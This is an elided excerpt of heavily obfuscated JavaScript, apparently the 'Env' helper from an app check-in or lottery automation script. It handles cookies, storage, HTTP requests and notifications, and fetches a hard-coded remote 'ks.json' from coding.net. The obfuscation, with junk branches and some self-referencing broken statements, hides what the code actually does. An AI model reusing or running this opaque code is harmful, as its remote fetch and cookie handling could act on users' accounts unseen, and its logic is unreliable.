			a < 128 ? C += String["fromCharCode"](a) : a > 127 && a < 2048 ? (C += String["fromCharCode"](a >> 6 |
				192), C += String["fromCharCode"](a & 63 | 128)) : (C += String["fromCharCode"](a >> 12 | 224),
				C += String["fromCharCode"](a >> 6 & 63 | 128), C += String['fromCharCode'](a & 63 | 128));
		}
	...
	_utf8_decode = function(c) {
		...
		while (S < c["length"]) {
			a = c["charCodeAt"](S);
			a < 128 ? (C += String["fromCharCode"](a), S++) : a > 191 && a < 224 ? (c2 = c["charCodeAt"](S + 1),
				C += String["fromCharCode"]((a & 31) << 6 | c2 & 63), S += 2) : (c2 = c["charCodeAt"](S + 1),
				c3 = c["charCodeAt"](S + 2), C += String["fromCharCode"]((a & 15) << 12 | (c2 & 63) << 6 | c3 &
					63), S += 3);
		}
...
function Envcc(T, c) {
	const p = {
		...
		'dceom': 'ijzfe',
		'JighY': 'updateMsg',
		'uwDzR': "https://zzt666.coding.net/p/ql/d/ql/git/raw/master/ks.json",
		'CvmUM': function(S, a) {
			return S === a;
		},
		'QfLFC': "JwVvM",
	...
	class C {
			...
			if (p["PXCCW"]("qAsGn", p["pqblD"])) {
				...
				try {
					if (Y["headers"][Y['XdGrR']]) {
						const Q = Q['headers']["set-cookie"][Y["CPaVV"]](this["cktough"]["Cookie"][Y["XBELw"]])[Y[
							"gcPYo"]]();
		...
		[p["etbIn"]](S) {
			return p['JpIGP']("KhBhn", "cXwUb") ? (I = V(E, W(O(P(h, z, v), M), d)), u(e(A, k), o)) : this["send"][p[
				"WvfSd"]](this["env"], S, p['vIUQB']);
		}
	...
	return new class {
		...
		[p["pFleU"]]() {
			return p["gioVk"](p['CnEfG'], p["CnEfG"]) ? p["QtKtG"](p['okFDC'], typeof $loon) : "undefined" !=
				typeof c;
		}
		...
		[p["QrmhW"]](S, a) {
			if (p["JpIGP"]('ViWHE', p["NOwog"])) {
				if (p["QwtqA"](q, i[p["LTEld"]])) {
					d = true;
					u = "https://zzt666.coding.net/p/ql/d/ql/git/raw/master/ks.json";
			...
			if (p["kAQmo"](p['FMTfD'], p["hJxpZ"])) {
				if (this[p["ZBOFC"]]()) {
					if (p["fpuZw"](p["sPEzq"], p["sPEzq"])) {
						...
						j ? this['fs'][p["GOITo"]](a, Q) : Z ? this['fs']['writeFileSync'](Y, Q) : this['fs'][
							"writeFileSync"
						](a, Q);
					} else {
						const {
		...
		[p["cfFUW"]](S, a, Y) {
			if (p["aLzlr"](p["guzpm"], p['vrSbp'])) {
				...
				for (const Q of j)
					if (Z = p['lCgzA'](Object, Z)[Q], p['iLgkV'](void 0, Z)) {
							...
							while (p['aSWQu'](i, U[p["BjSlF"]])) {
								...
								while (true) {
									switch (z[t++]) {
										...
										case '4':
											h = p["Dwexk"](p["UAuSH"](h, this[p["qomwh"]]["charAt"](E)) + this[p[
												"qomwh"]]['charAt'](W), this[p["qomwh"]][p["cYctR"]](O)) + this[
												p["qomwh"]][p["cYctR"]](P);
											continue;
		...
		['lodash_set'](S, a, Y) {
			...
			if ("qTlGs" === p['AoWvA']) {
				...
				return p['kjSki'](p["QXGGz"](Object, S), S) ? S : (Array[p['NdcoI']](a) || (a = a[p["zmrLt"]]()[
					"match"](/[^.[\]]+/g) || []), a['slice'](0, -1)[p['FSxYT']]((Q, B, b) => Object(Q[
					B]) === Q[B] ? Q[B] : Q[B] = Math["abs"](a[b + 1]) >> 0 == +a[b + 1] ? [] : {}, S)[a[a[
					"length"] - 1]] = Y, S);
			}
		}
		...
		["setdata"](S, a) {
			...
			if (p["wNPNi"](p["TcHpJ"], p["TcHpJ"])) {
				p[Y["CsmMy"]](Y['izhWR'](Y["izhWR"](Y["QMsKl"](Y["SYuBn"], this["name"]), "]查询抽奖次数失败："), C[Y[
					"uYRqB"]]));
			} else {
				let Z = false;
		...
		[p['KpXSW']](S) {
			if (p["CvmUM"]("JwVvM", p["QfLFC"])) {
				return this["isSurge"]() || this[p["pFleU"]]() ? $persistentStore[p["tDtzG"]](S) : this[p["iQFDW"]]
				() ? $prefs[p["Dixqr"]](S) : this[p["ZBOFC"]]() ? (this[p["bJyZO"]] = this[p["oaHVG"]](), this[
					p["bJyZO"]][S]) : this[p['bJyZO']] && this['data'][S] || null;
			} else {
				Q = true;
				B = p['uwDzR'];
		...
		[p["CMAOs"]](S, a) {
			if (p["trKFz"]("RncrN", p['pXFEM'])) {
				p["SjPNS"](h, 191) && z < 224 ? (v = M[p["VjGXc"]](p["Dwexk"](d, 1)), u += e[p['ahFam']](p["grcPA"](
					p['TkIxf'](p["Ibluv"](A, 31), 6), p['VmoGf'](k, 63))), o += 2) : (g = t[p["VjGXc"]](L + 1),
					X = m[p["VjGXc"]](p['byKEy'](n, 2)), F += w[p['ahFam']](p['lEwQp'](p['lEwQp'](p['VRRCq'](G &
						15, 12), p['VRRCq'](p["OwlMa"](s, 63), 6)), p["bigyF"](N, 63))), l += 3);
			} else {
				return this[p["otPpW"]]() || this["isLoon"]() ? $persistentStore[p['vZbwI']](S, a) : this[p[
						'iQFDW']]() ? $prefs[p["VLgNd"]](S, a) : this[p['ZBOFC']]() ? (this[p['bJyZO']] = this[
						"loaddata"](), this[p["bJyZO"]][a] = S, this[p['sqZqT']](), true) : this[p['bJyZO']] &&
					this[p['bJyZO']][a] || null;
			}
		}
		...
		["initGotEnv"](S) {
			...
			S && (S[p['CnQpI']] = S["headers"] ? S["headers"] : {}, p["TtnJv"](void 0, S["headers"][p['RMosR']]) &&
				p["YNyqr"](void 0, S[p['yVUhK']]) && (S[p["yVUhK"]] = this["ckjar"]));
		}
		...
		[p["RKmAs"]](S, a = () => {}) {
			...
			if (S["headers"] && (delete S[p["CnQpI"]]['Content-Type'], delete S[p["CnQpI"]][p["TmduP"]]), this[p[
					"otPpW"]]() || this['isLoon']()) {
				const j = {
					'X-Surge-Skip-Scripting': false
				};
				this[p["otPpW"]]() && this[p["dkryr"]] && (S["headers"] = S[p["CnQpI"]] || {}, Object[p['jQefX']](S[
					p['CnQpI']], j));
				...
				if (this[p["iQFDW"]]()) {
					if (p['aLzlr'](p["vqIld"], p["vqIld"])) {
						const Q = p['headers'][Y["UdqGV"]][Y["TUnPR"]](this["cktough"][Y["HoMdV"]][Y["avXXf"]])[Y[
							"BnDZw"]]();
						...
						$task[p['AVdeR']](S)["then"](B => {
							if (Y["yBIqC"]("cAblz", "BdVDO")) {
								...
								for (const W of V)
									if (E = Y['UklYl'](Z, E)[W], Y["LSabO"](void 0, E)) {
										return B;
									}
									...
									if (p['GlHrm'](p["whkmH"], p["LnFLI"])) {
										if (b[p["CnQpI"]]['set-cookie']) {
											if (p['AZIgJ'](p['yVGro'], p["YwLUJ"])) {
												...
												const J = b[p['CnQpI']][p["mwHZH"]][p['OoXTZ']](this[
													'cktough'][p['RMosR']][p["cdqvA"]])[p["zmrLt"]]();
		...
		['post'](S, a = () => {}) {
			...
			if (p["COyHl"](p["FqyOv"], p['FqyOv'])) {
				...
				if (S['body'] && S["headers"] && !S[p["CnQpI"]][p["GPTjE"]] && (S[p["CnQpI"]][p["GPTjE"]] = p[
						"KGaQY"]), S[p['CnQpI']] && delete S["headers"]["Content-Length"], this[p["otPpW"]]() ||
					this[p["pFleU"]]()) {
					const Z = {
						'X-Surge-Skip-Scripting': false
					};
					this[p["otPpW"]]() && this['isNeedRewrite'] && (S[p["CnQpI"]] = S[p["CnQpI"]] || {}, Object[p[
						'jQefX']](S[p["CnQpI"]], Z));
					...
					if (this["isQuanX"]()) {
						if (p['eXpjG'](p["uxKuS"], p["YflCp"])) {
							...
							this[p["dkryr"]] && (S["opts"] = S[p["DSYHW"]] || {}, Object[p["jQefX"]](S[p['DSYHW']],
								Q));
							$task["fetch"](S)["then"](B => {
								const {
									'statusCode': b,
						...
						if (p["SzLrO"] === p["iLBMM"]) {
							...
							while (p["aSWQu"](q, E["length"])) {
								i = g['charCodeAt'](q);
								i < 128 ? (U += r[p['ahFam']](i), q++) : i > 191 && i < 224 ? (D = K["charCodeAt"](
									p["Dwexk"](q, 1)), U += y[p["ahFam"]](p['jwBsW'](p["VRRCq"](p["QuYWg"](
									i, 31), 6), p["QuYWg"](H, 63))), q += 2) : (x0 = x1[p["VjGXc"]](p["VjinD"](
									q, 1)), x2 = x3[p["VjGXc"]](q + 2), U += x4[p["ahFam"]](p["lEwQp"](p[
									"bigyF"](i, 15) << 12 | p["TeveR"](p['OwlMa'](x5, 63), 6), p[
									"XdkAK"](x6, 63))), q += 3);
							}
		...
		[p['gpnqP']](S, a = null) {
			if (p["trKFz"]("brNJU", p['VDccZ'])) {
				...
				/(y+)/ [p["klehG"]](S) && (S = S[p["oxSDa"]](RegExp['$1'], (j[p['vbWqg']]() + '')[p['tqfVj']](p[
					"JXjvz"](4, RegExp['$1'][p["BjSlF"]]))));

				for (let Q in Z) new RegExp(p['fVzdw'](p['UAuSH']('(', Q), ')'))[p['klehG']](S) && (S = S["replace"]
					(RegExp['$1'], p['wIaAf'](1, RegExp['$1'][p["BjSlF"]]) ? Z[Q] : p["TzKdY"]('00', Z[Q])[
						"substr"](p["CjPRq"]('', Z[Q])["length"])));
		...
		[p["EqCpB"]](S = T, a = '', Y = '', j) {
			...
			if (this[p["wCvXJ"]] || (this[p["otPpW"]]() || this[p["pFleU"]]() ? $notification[p["etbIn"]](S, a, Y,
					p['MwUVs'](Q, j)) : this[p["iQFDW"]]() && p['DlZAG']($notify, S, a, Y, p['DkbBH'](Q, j))), !
				this[p["Ofyag"]]) {
				if (p["QJAuk"](p["gbJiu"], "YYdDH")) {
					...
					p['aSWQu'](U, 128) ? e += A["fromCharCode"](U) : U > 127 && p["aSWQu"](U, 2048) ? (k += o[p[
						"ahFam"]](p["lTwok"](p["PWzGA"](U, 6), 192)), g += t[p['ahFam']](p["lEwQp"](p[
						'VmoGf'](U, 63), 128))) : (L += X[p["ahFam"]](p["PWzGA"](U, 12) | 224), m += n[
						"fromCharCode"](p['RQlYQ'](p["dnKxP"](U, 6) & 63, 128)), F += w[p["ahFam"]](p[
						"MuZQP"](p['LUylu'](U, 63), 128)));
				}
			}
		}
		...
		[p["UpyIA"]](S, a) {
			if (p["NjfUP"] === p["NjfUP"]) {
				...
				Y ? this[p["zptFf"]]('', '❗️' + this[p["hxvZu"]] + p["PLJvd"], S[p["yObaT"]]) : this['log']('', p[
					"fkDrB"](p["CjPRq"]('❗️', this[p["hxvZu"]]), p['PLJvd']), S);
			} else {
				return p - C;
			}
		}
